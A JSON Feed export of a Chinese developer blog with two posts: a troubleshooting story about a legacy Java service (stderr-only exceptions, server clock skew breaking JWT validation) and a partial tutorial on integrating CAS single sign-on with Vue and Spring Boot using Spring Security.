{
    "version": "https://jsonfeed.org/version/1",
    "title": "a1oyss",
    "subtitle": "",
    "icon": "https://a1oyss.github.io/images/favicon.ico",
    "description": "随便写点什么",
    "home_page_url": "https://a1oyss.github.io",
    "items": [
        {
            "id": "https://a1oyss.github.io/%E6%9D%82%E8%AE%B0/%E4%B8%80%E6%AC%A1%E6%93%8D%E8%9B%8B%E7%9A%84%E7%BA%BF%E4%B8%8A%E6%9C%8D%E5%8A%A1%E6%8E%92%E9%94%99%E7%BB%8F%E5%8E%86/",
            "url": "https://a1oyss.github.io/%E6%9D%82%E8%AE%B0/%E4%B8%80%E6%AC%A1%E6%93%8D%E8%9B%8B%E7%9A%84%E7%BA%BF%E4%B8%8A%E6%9C%8D%E5%8A%A1%E6%8E%92%E9%94%99%E7%BB%8F%E5%8E%86/",
            "title": "一次操蛋的线上服务排错经历",
            "date_published": "2022-12-19T13:45:26.000Z",
            "content_html": "<p>#Java #BUG #异常</p>\n<h1 id=\"起因\"><a class=\"anchor\" href=\"#起因\">#</a> 起因</h1>\n<p>大概是组里人手不够吧，反正就是把我拉去排查一个 N 多年前的项目的 bug，听描述就是微信公众号推送消息的代码有问题，不过之前没对接过，说实话还不知道具体流程，死马当活马医了。</p>\n<h1 id=\"bug1\"><a class=\"anchor\" href=\"#bug1\">#</a> BUG1</h1>\n<p>先进服务器看下日志，直接就看到一个形如栈溢出的异常，不过最后抛出的不是 StackOverflow，好像是空指针之类的异常，于是把代码拉下来看了眼，果不其然<br />\n<img data-src=\"https://s2.loli.net/2022/12/19/ReJY56ZLK4EPnd1.png\" alt=\"\" /><br />\n<img data-src=\"https://s2.loli.net/2022/12/19/gXIBU1zlPJ8Y9fW.png\" alt=\"\" /></p>\n<p>只能说这写的是真的神秘，咱也不知道当时到底是什么需求，会导致这样的代码，听说这 jsticket 反正也不用了，干脆就给注释了。<br />\n然后跑了一下发现还是不通，于是就去试了下 api，结果发现限额用光了，换了个 key，bug1 解决。</p>\n<h1 id=\"bug2\"><a class=\"anchor\" href=\"#bug2\">#</a> BUG2</h1>\n<p>刚解决完一个 bug，又告诉我登录跳转有问题，这次查日志，就发现一个 Authentication Failed! 还是别家公司的 sdk 里提示的，根据 exception 信息里的代码行数去找了下源码，结果发现异常没做日志，而是使用 pringStackTrace () 直接打印了，结果不管是日志还是错误页面都没有</p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">try</span> <span class=\"token punctuation\">&#123;</span>  </pre></td></tr><tr><td data-num=\"2\"></td><td><pre>   <span class=\"token comment\">// OAuth2 认证  </span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">catch</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">Exception</span> e<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>  </pre></td></tr><tr><td data-num=\"4\"></td><td><pre>   e<span class=\"token punctuation\">.</span><span class=\"token function\">printStackTrace</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  </pre></td></tr><tr><td data-num=\"5\"></td><td><pre>   <span class=\"token keyword\">throw</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Exception</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Authentication Failed\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  </pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>同时我也很好奇为什么 e.pringStackTrace 为什么打印不到日志中，于是看了下源码</p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token keyword\">void</span> <span class=\"token function\">printStackTrace</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>  </pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token function\">printStackTrace</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>err<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  </pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token punctuation\">&#125;</span>  </pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  </pre></td></tr><tr><td data-num=\"5\"></td><td><pre> </pre></td></tr><tr><td data-num=\"6\"></td><td><pre> <span class=\"token operator\">*</span><span class=\"token operator\">/</span><span class=\"token keyword\">public</span> <span class=\"token keyword\">void</span> <span class=\"token function\">printStackTrace</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">PrintStream</span> s<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>  </pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token function\">printStackTrace</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">WrappedPrintStream</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  </pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>看到上面的 System.err 就知道了， <code>Typically this stream corresponds to display output or another output destination specified by the host environment or user.</code>  一般这个流会输出到屏幕上，也就是控制台，或者用户定义的其他输出流。而刚才查看的 log 又是使用日志框架记录的，自然不会记录到 stderr 的内容。<br />\n于是又上去找其他日志，发现同目录下面还有个 tomcat-stderr.logs 的文件，打开来后果然发现有真正的报错信息</p>\n<pre><code>InvalidClaimException: The Token can't be used before xxx\n</code></pre>\n<p>大致意思是 token 不能在某个时间点之前使用，然后看了下时间，发现服务器上的时间居然和真实时间错了 3 个小时。。。同步回正常时间后，成功运行。</p>\n",
            "tags": [
                "杂记",
                "BUG",
                "Java",
                "异常"
            ]
        },
        {
            "id": "https://a1oyss.github.io/%E7%AC%94%E8%AE%B0/Vue+SpringBoot+Cas%20%E5%89%8D%E5%90%8E%E7%AB%AF%E5%88%86%E7%A6%BB%E6%96%B9%E5%BC%8F%E5%AF%B9%E6%8E%A5Cas/",
            "url": "https://a1oyss.github.io/%E7%AC%94%E8%AE%B0/Vue+SpringBoot+Cas%20%E5%89%8D%E5%90%8E%E7%AB%AF%E5%88%86%E7%A6%BB%E6%96%B9%E5%BC%8F%E5%AF%B9%E6%8E%A5Cas/",
            "title": "Vue+SpringBoot+Cas 前后端分离方式对接Cas",
            "date_published": "2022-11-28T16:40:49.000Z",
            "content_html": "<p>#SpringBoot #Vue #CAS  #单点登录 #前后端分离</p>\n<h1 id=\"前言\"><a class=\"anchor\" href=\"#前言\">#</a> 前言</h1>\n<p>因为组里来了新的前端，所以新开的项目就都准备用前后端分离的方式来做，原本还挺爽的，只用写自己接口就完事了，但是到了对接甲方 CAS 的时候就出了问题。</p>\n<h1 id=\"cas认证流程\"><a class=\"anchor\" href=\"#cas认证流程\">#</a> CAS 认证流程</h1>\n<p>官网给出的认证流程如下，<br />\n<img data-src=\"https://s2.loli.net/2022/11/30/yH9ki1vE2KgaWlD.png\" alt=\"\" /></p>\n<p>TGC，TGT，ST 之类的概念就不说了，网上一搜一大堆，简单来说就是访问网站后没登陆就跳到 cas 认证中心，登录完会在浏览器存一个 cookie 叫 TGC（用来标识你登陆过了，以及后续获取 ticket），跳转到你的服务上，并且 url 后面会携带一个 ticket，也就是 ST，client 接收到这次请求后（一般是通过 filter 拦截地址，而地址默认是 /cas/login，当然也可以自己设置），会把 ticket 发送给 cas server 去验证，验证通过后返回 xml 结构的用户信息。</p>\n<h1 id=\"后端流程\"><a class=\"anchor\" href=\"#后端流程\">#</a> 后端流程</h1>\n<p>前后端分离对接 CAS 的流程一般是前端负责跳转登录页面，并且接收登录之后返回的 ticket，将其传给后端，后端在接收到 ticket 之后进行验证，验证成功后返回给前端一个标识，用来判断接下来的请求是否已经认证。<br />\n后端认证的话有两种方式，一种是通过 cas-client-core 或者 Spring Security 进行配置，配置完之后只需要给前端 /login 接口和 /logout 接口即可，当然这个地址也可以用过 setFilterProcessesUrl 来自定义。<br />\n另一种方式自己写一个接口，直接请求 CAS Server 的验证票据接口，认证成功后返回给前端一个 token，证明已经认证成功。</p>\n<h1 id=\"一-spring-security代码实现\"><a class=\"anchor\" href=\"#一-spring-security代码实现\">#</a> 一、Spring Security 代码实现</h1>\n<h1 id=\"1-spring-security配置\"><a class=\"anchor\" href=\"#1-spring-security配置\">#</a> 1. Spring Security 配置</h1>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token annotation punctuation\">@Configuration</span>  </pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token annotation punctuation\">@EnableWebSecurity</span>  </pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token annotation punctuation\">@EnableGlobalMethodSecurity</span><span class=\"token punctuation\">(</span>prePostEnabled <span class=\"token operator\">=</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">,</span> securedEnabled <span class=\"token operator\">=</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">)</span>  </pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">CasSecurityConfig</span> <span class=\"token keyword\">extends</span> <span class=\"token class-name\">WebSecurityConfigurerAdapter</span> <span class=\"token punctuation\">&#123;</span>  </pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token annotation punctuation\">@Value</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"$&#123;cas.server-host-url&#125;\"</span><span class=\"token punctuation\">)</span>  </pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">private</span> <span class=\"token class-name\">String</span> serverHostUrl<span class=\"token punctuation\">;</span>  </pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token annotation punctuation\">@Value</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"$&#123;cas.server-host-login-url&#125;\"</span><span class=\"token punctuation\">)</span>  </pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token keyword\">private</span> <span class=\"token class-name\">String</span> serverHostLoginUrl<span class=\"token punctuation\">;</span>  </pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token annotation punctuation\">@Value</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"$&#123;cas.client-host-url&#125;\"</span><span class=\"token punctuation\">)</span>  </pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token keyword\">private</span> <span class=\"token class-name\">String</span> clientHostUrl<span class=\"token punctuation\">;</span>  </pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token annotation punctuation\">@Autowired</span>  </pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token keyword\">private</span> <span class=\"token class-name\">CustomUserDetailsService</span> customUserDetailsService<span class=\"token punctuation\">;</span>  </pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token annotation punctuation\">@Autowired</span>  </pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token keyword\">private</span> <span class=\"token class-name\">CustomAuthenticationEntryPoint</span> unAuthenticationEntrypoint<span class=\"token punctuation\">;</span>  </pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token annotation punctuation\">@Autowired</span>  </pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token keyword\">private</span> <span class=\"token class-name\">LogoutSuccessHandlerImpl</span> logoutSuccessHandler<span class=\"token punctuation\">;</span>  </pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token annotation punctuation\">@Autowired</span>  </pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token keyword\">private</span> <span class=\"token class-name\">CasAuthenticationSuccessHandler</span> casAuthenticationSuccessHandler<span class=\"token punctuation\">;</span>  </pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token annotation punctuation\">@Autowired</span>  </pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token keyword\">private</span> <span class=\"token class-name\">JwtAuthenticationTokenFilter</span> authenticationTokenFilter<span class=\"token punctuation\">;</span>  </pre></td></tr><tr><td data-num=\"21\"></td><td><pre>  </pre></td></tr><tr><td data-num=\"22\"></td><td><pre>  </pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    <span class=\"token annotation punctuation\">@Override</span>  </pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    <span class=\"token keyword\">protected</span> <span class=\"token keyword\">void</span> <span class=\"token function\">configure</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">HttpSecurity</span> httpSecurity<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">Exception</span> <span class=\"token punctuation\">&#123;</span>  </pre></td></tr><tr><td data-num=\"25\"></td><td><pre>        httpSecurity  </pre></td></tr><tr><td data-num=\"26\"></td><td><pre>                <span class=\"token punctuation\">.</span><span class=\"token function\">cors</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">disable</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>  </pre></td></tr><tr><td data-num=\"27\"></td><td><pre>                <span class=\"token punctuation\">.</span><span class=\"token function\">csrf</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">disable</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>  </pre></td></tr><tr><td data-num=\"28\"></td><td><pre>                <span class=\"token comment\">// 过滤请求  </span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>                <span class=\"token punctuation\">.</span><span class=\"token function\">sessionManagement</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">sessionCreationPolicy</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">SessionCreationPolicy</span><span class=\"token punctuation\">.</span><span class=\"token constant\">STATELESS</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">and</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>  </pre></td></tr><tr><td data-num=\"30\"></td><td><pre>                <span class=\"token punctuation\">.</span><span class=\"token function\">authorizeRequests</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>  </pre></td></tr><tr><td data-num=\"31\"></td><td><pre>                <span class=\"token punctuation\">.</span><span class=\"token function\">antMatchers</span><span class=\"token punctuation\">(</span>  </pre></td></tr><tr><td data-num=\"32\"></td><td><pre>                        <span class=\"token class-name\">HttpMethod</span><span class=\"token punctuation\">.</span><span class=\"token constant\">GET</span><span class=\"token punctuation\">,</span>  </pre></td></tr><tr><td data-num=\"33\"></td><td><pre>                        <span class=\"token string\">\"/*.html\"</span><span class=\"token punctuation\">,</span>  </pre></td></tr><tr><td data-num=\"34\"></td><td><pre>                        <span class=\"token string\">\"/**/*.js\"</span><span class=\"token punctuation\">,</span>  </pre></td></tr><tr><td data-num=\"35\"></td><td><pre>                        <span class=\"token string\">\"/profile/**\"</span><span class=\"token punctuation\">,</span>  </pre></td></tr><tr><td data-num=\"36\"></td><td><pre>                        <span class=\"token string\">\"/error\"</span><span class=\"token punctuation\">,</span>  </pre></td></tr><tr><td data-num=\"37\"></td><td><pre>                        <span class=\"token string\">\"/api/**\"</span><span class=\"token punctuation\">,</span>  </pre></td></tr><tr><td data-num=\"38\"></td><td><pre>                        <span class=\"token string\">\"/**/*.css\"</span><span class=\"token punctuation\">,</span>  </pre></td></tr><tr><td data-num=\"39\"></td><td><pre>                        <span class=\"token string\">\"/**/*.png\"</span><span class=\"token punctuation\">,</span>  </pre></td></tr><tr><td data-num=\"40\"></td><td><pre>                        <span class=\"token string\">\"/**/*.jpg\"</span><span class=\"token punctuation\">,</span>  </pre></td></tr><tr><td data-num=\"41\"></td><td><pre>                        <span class=\"token string\">\"/**/*.jpeg\"</span><span class=\"token punctuation\">,</span>  </pre></td></tr><tr><td data-num=\"42\"></td><td><pre>                        <span class=\"token string\">\"/**/*.gif\"</span><span class=\"token punctuation\">,</span>  </pre></td></tr><tr><td data-num=\"43\"></td><td><pre>                        <span class=\"token string\">\"/**/*.ico\"</span><span class=\"token punctuation\">,</span>  </pre></td></tr><tr><td data-num=\"44\"></td><td><pre>                        <span class=\"token string\">\"/font/**\"</span>  </pre></td></tr><tr><td data-num=\"45\"></td><td><pre>                <span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">permitAll</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>  </pre></td></tr><tr><td data-num=\"46\"></td><td><pre>                <span class=\"token punctuation\">.</span><span class=\"token function\">antMatchers</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"/swagger-ui.html\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">anonymous</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>  </pre></td></tr><tr><td data-num=\"47\"></td><td><pre>                <span class=\"token punctuation\">.</span><span class=\"token function\">antMatchers</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"/swagger-resources/**\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">anonymous</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>  </pre></td></tr><tr><td data-num=\"48\"></td><td><pre>                <span class=\"token punctuation\">.</span><span class=\"token function\">antMatchers</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"/*/api-docs\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">anonymous</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>  </pre></td></tr><tr><td data-num=\"49\"></td><td><pre>                <span class=\"token punctuation\">.</span><span class=\"token function\">antMatchers</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"/druid/**\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">anonymous</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>  </pre></td></tr><tr><td data-num=\"50\"></td><td><pre>                <span class=\"token comment\">// 除上面外的所有请求全部需要鉴权认证  </span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>                <span class=\"token punctuation\">.</span><span class=\"token function\">anyRequest</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">authenticated</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>  </pre></td></tr><tr><td data-num=\"52\"></td><td><pre>                <span class=\"token punctuation\">.</span><span class=\"token function\">and</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>  </pre></td></tr><tr><td data-num=\"53\"></td><td><pre>                <span class=\"token punctuation\">.</span><span class=\"token function\">headers</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">frameOptions</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">disable</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  </pre></td></tr><tr><td data-num=\"54\"></td><td><pre>        httpSecurity<span class=\"token punctuation\">.</span><span class=\"token function\">exceptionHandling</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>  </pre></td></tr><tr><td data-num=\"55\"></td><td><pre>                <span class=\"token punctuation\">.</span><span class=\"token function\">authenticationEntryPoint</span><span class=\"token punctuation\">(</span>unAuthenticationEntrypoint<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">and</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>  </pre></td></tr><tr><td data-num=\"56\"></td><td><pre>                <span class=\"token punctuation\">.</span><span class=\"token function\">addFilterAt</span><span class=\"token punctuation\">(</span><span class=\"token function\">casAuthenticationFilter</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">CasAuthenticationFilter</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">)</span>  </pre></td></tr><tr><td data-num=\"57\"></td><td><pre>                <span class=\"token punctuation\">.</span><span class=\"token function\">addFilterBefore</span><span class=\"token punctuation\">(</span>authenticationTokenFilter<span class=\"token punctuation\">,</span> <span class=\"token class-name\">CasAuthenticationFilter</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">)</span>  </pre></td></tr><tr><td data-num=\"58\"></td><td><pre>                <span class=\"token punctuation\">.</span><span class=\"token function\">addFilterBefore</span><span class=\"token punctuation\">(</span><span class=\"token function\">logoutFilter</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">LogoutFilter</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">)</span>  </pre></td></tr><tr><td data-num=\"59\"></td><td><pre>                <span class=\"token punctuation\">.</span><span class=\"token function\">addFilterBefore</span><span class=\"token punctuation\">(</span><span class=\"token function\">singleSignOutFilter</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">CasAuthenticationFilter</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  </pre></td></tr><tr><td data-num=\"60\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span>  </pre></td></tr><tr><td data-num=\"61\"></td><td><pre>  </pre></td></tr><tr><td data-num=\"62\"></td><td><pre>    <span class=\"token annotation punctuation\">@Override</span>  </pre></td></tr><tr><td data-num=\"63\"></td><td><pre>    <span class=\"token keyword\">protected</span> <span class=\"token keyword\">void</span> <span class=\"token function\">configure</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">AuthenticationManagerBuilder</span> auth<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">Exception</span> <span class=\"token punctuation\">&#123;</span>  </pre></td></tr><tr><td data-num=\"64\"></td><td><pre>        <span class=\"token keyword\">super</span><span class=\"token punctuation\">.</span><span class=\"token function\">configure</span><span class=\"token punctuation\">(</span>auth<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  </pre></td></tr><tr><td data-num=\"65\"></td><td><pre>        auth<span class=\"token punctuation\">.</span><span class=\"token function\">authenticationProvider</span><span class=\"token punctuation\">(</span><span class=\"token function\">casAuthenticationProvider</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  </pre></td></tr><tr><td data-num=\"66\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span>  </pre></td></tr><tr><td data-num=\"67\"></td><td><pre>  </pre></td></tr><tr><td data-num=\"68\"></td><td><pre>    <span class=\"token annotation punctuation\">@Bean</span>  </pre></td></tr><tr><td data-num=\"69\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token class-name\">CasAuthenticationEntryPoint</span> <span class=\"token function\">authenticationEntryPoint</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>  </pre></td></tr><tr><td data-num=\"70\"></td><td><pre>        <span class=\"token class-name\">CasAuthenticationEntryPoint</span> casAuthenticationEntryPoint <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">CasAuthenticationEntryPoint</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  </pre></td></tr><tr><td data-num=\"71\"></td><td><pre>        casAuthenticationEntryPoint<span class=\"token punctuation\">.</span><span class=\"token function\">setLoginUrl</span><span class=\"token punctuation\">(</span>serverHostLoginUrl<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  </pre></td></tr><tr><td data-num=\"72\"></td><td><pre>        casAuthenticationEntryPoint<span class=\"token punctuation\">.</span><span class=\"token function\">setServiceProperties</span><span class=\"token punctuation\">(</span><span class=\"token function\">serviceProperties</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  </pre></td></tr><tr><td data-num=\"73\"></td><td><pre>        <span class=\"token keyword\">return</span> casAuthenticationEntryPoint<span class=\"token punctuation\">;</span>  </pre></td></tr><tr><td data-num=\"74\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span>  </pre></td></tr><tr><td data-num=\"75\"></td><td><pre>  </pre></td></tr><tr><td data-num=\"76\"></td><td><pre>    <span class=\"token annotation punctuation\">@Bean</span>  </pre></td></tr><tr><td data-num=\"77\"></td><td><pre>    <span class=\"token annotation punctuation\">@Override</span>    <span class=\"token keyword\">public</span> <span class=\"token class-name\">AuthenticationManager</span> <span class=\"token function\">authenticationManagerBean</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">Exception</span> <span class=\"token punctuation\">&#123;</span>  </pre></td></tr><tr><td data-num=\"78\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token keyword\">super</span><span class=\"token punctuation\">.</span><span class=\"token function\">authenticationManagerBean</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  </pre></td></tr><tr><td data-num=\"79\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span>  </pre></td></tr><tr><td data-num=\"80\"></td><td><pre>  </pre></td></tr><tr><td data-num=\"81\"></td><td><pre>    <span class=\"token annotation punctuation\">@Bean</span>  </pre></td></tr><tr><td data-num=\"82\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token class-name\">ServiceProperties</span> <span class=\"token function\">serviceProperties</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>  </pre></td></tr><tr><td data-num=\"83\"></td><td><pre>        <span class=\"token class-name\">ServiceProperties</span> serviceProperties <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">ServiceProperties</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  </pre></td></tr><tr><td data-num=\"84\"></td><td><pre>        serviceProperties<span class=\"token punctuation\">.</span><span class=\"token function\">setService</span><span class=\"token punctuation\">(</span>clientHostUrl <span class=\"token operator\">+</span> <span class=\"token string\">\"/login\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  </pre></td></tr><tr><td data-num=\"85\"></td><td><pre>        serviceProperties<span class=\"token punctuation\">.</span><span class=\"token function\">setAuthenticateAllArtifacts</span><span class=\"token punctuation\">(</span><span class=\"token boolean\">true</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  </pre></td></tr><tr><td data-num=\"86\"></td><td><pre>        <span class=\"token keyword\">return</span> serviceProperties<span class=\"token punctuation\">;</span>  </pre></td></tr><tr><td data-num=\"87\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span>  </pre></td></tr><tr><td data-num=\"88\"></td><td><pre>  </pre></td></tr><tr><td data-num=\"89\"></td><td><pre>    <span class=\"token annotation punctuation\">@Bean</span>  </pre></td></tr><tr><td data-num=\"90\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token class-name\">TicketValidator</span> <span class=\"token function\">ticketValidator</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>  </pre></td></tr><tr><td data-num=\"91\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Cas20ProxyTicketValidator</span><span class=\"token punctuation\">(</span>serverHostUrl<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  </pre></td></tr><tr><td data-num=\"92\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span>  </pre></td></tr><tr><td data-num=\"93\"></td><td><pre>  </pre></td></tr><tr><td data-num=\"94\"></td><td><pre>    <span class=\"token annotation punctuation\">@Bean</span>  </pre></td></tr><tr><td data-num=\"95\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token class-name\">CasAuthenticationProvider</span> <span class=\"token function\">casAuthenticationProvider</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>  </pre></td></tr><tr><td data-num=\"96\"></td><td><pre>        <span class=\"token class-name\">CasAuthenticationProvider</span> provider <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">CasAuthenticationProvider</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  </pre></td></tr><tr><td data-num=\"97\"></td><td><pre>        provider<span class=\"token punctuation\">.</span><span class=\"token function\">setServiceProperties</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span><span class=\"token function\">serviceProperties</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  </pre></td></tr><tr><td data-num=\"98\"></td><td><pre>        provider<span class=\"token punctuation\">.</span><span class=\"token function\">setTicketValidator</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span><span class=\"token function\">ticketValidator</span><span class=\"token punctuation\">(</span><span class=\"token 